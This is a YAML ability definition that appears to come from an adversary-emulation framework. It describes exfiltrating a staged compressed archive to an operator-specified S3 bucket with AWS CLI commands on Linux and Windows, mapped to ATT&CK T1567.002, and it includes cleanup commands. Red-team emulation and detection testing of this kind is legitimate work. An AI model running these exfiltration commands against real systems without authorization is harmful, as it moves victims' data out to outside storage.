- id: e7bf5dc7-62e4-48b2-acf8-abaf8734c19c
  name: Exfil Compressed Archive to S3 via AWS CLI
  description: |
    Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user
    credentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.
  tactic: exfiltration
  technique:
    attack_id: T1567.002
    name: 'Exfiltration to Cloud Storage'
  platforms:
    linux:
      sh:
        command: |
          LocalFile='#{file.staged_at}';
          RemoteName="exfil-#{paw}-$(basename $LocalFile)";
          aws s3 cp #{file.staged_at} s3://#{custom.s3_name}/$RemoteName;
        cleanup: |
          LocalFile='#{file.staged_at}';
          RemoteName="exfil-#{paw}-$(basename $LocalFile)";
          aws s3 rm s3://#{custom.s3_name}/$RemoteName;
    windows:
      psh:
        command: |
          $SourceFile = (Get-Item #{file.staged_at});
          $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
          aws s3 cp #{file.staged_at} s3://#{custom.s3_name}/$RemoteName;
        cleanup: |
          $SourceFile = (Get-Item #{file.staged_at});
          $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
          aws s3 rm s3://#{custom.s3_name}/$RemoteName;
  requirements:
    - plugins.stockpile.app.requirements.paw_provenance:
      - source: file.staged_at
    - plugins.stockpile.app.requirements.basic:
        - source: file.staged_at
          edge: is_compressed